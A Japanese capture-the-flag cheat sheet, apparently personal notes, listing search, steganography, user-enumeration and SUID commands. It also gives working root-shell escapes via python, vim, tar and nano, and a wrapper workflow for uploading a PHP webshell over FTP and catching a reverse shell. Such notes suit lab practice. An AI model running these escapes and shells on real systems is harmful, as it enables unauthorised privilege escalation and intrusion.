# 便利コマンド

## 検索系

### ファイルを見つける

#### ファイル名

```bash
find / -type f -name "user.txt" 2>/dev/null
```

#### 文字列

```bash
grep -R "flag" .
```

高速版

```bash
rg "flag"
```

## 画像系

```bash
steg-extract <image>              # info → 空PW → stegcracker → 展開まで一括
steg-extract <image> <wordlist>   # ワードリスト指定
stegx <image>                     # 同上（短縮）
```

手動でやる場合:

```bash
steghide info <path>
stegcracker <path> $RECON_PASSLIST
steghide extract -sf <path>
```

## 権限昇格の事前準備

### ユーザ確認

#### ログイン可能なユーザ

```bash
grep -vE '(nologin|false)$' /etc/passwd
```

#### 存在するユーザ

```bash
cut -d: -f1 /etc/passwd
```

## 権限昇格系

### SUIDが付与されているファイル検索

```bash
find / -perm -4000 2>/dev/null
```

### sudo で実行可能なコマンド確認

シェルを取れたら最初に実行すべき定番のコマンド

```bash
sudo -l
```

### SUID権限ファイル検索

```bash
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```

### python で昇格

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### vim で昇格

```bash
sudo vim -c ':!/bin/sh'
```

### tar で昇格

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

## FTP → webshell → reverse shell

別ターミナルでリスナー:

```bash
listen 4444
```

アップロード＋トリガー:

```bash
cs startup          # cases/startup/ftp-shell を読む
ftprsh              # または ftprsh -P 4444
ftprsh -u           # upload 省略（トリガーのみ）
```

ルームごとにパスが違うとき:

```bash
# ケース設定ファイル（cs 時に自動読込）
# cases/<name>/ftp-shell
#   REMOTE_DIR=ftp
#   WEB_PREFIX=/files

# または都度指定
ftprsh -d ftp -w /files
ftprsh -U http://10.49.140.156/files/ftp/shell.php -u
```

デフォルト（設定なし）: `ftp://IP/shell.php` → `http://IP/shell.php`

## nano で昇格

```bash
sudo /bin/nano -s /bin/sh /dev/null
```
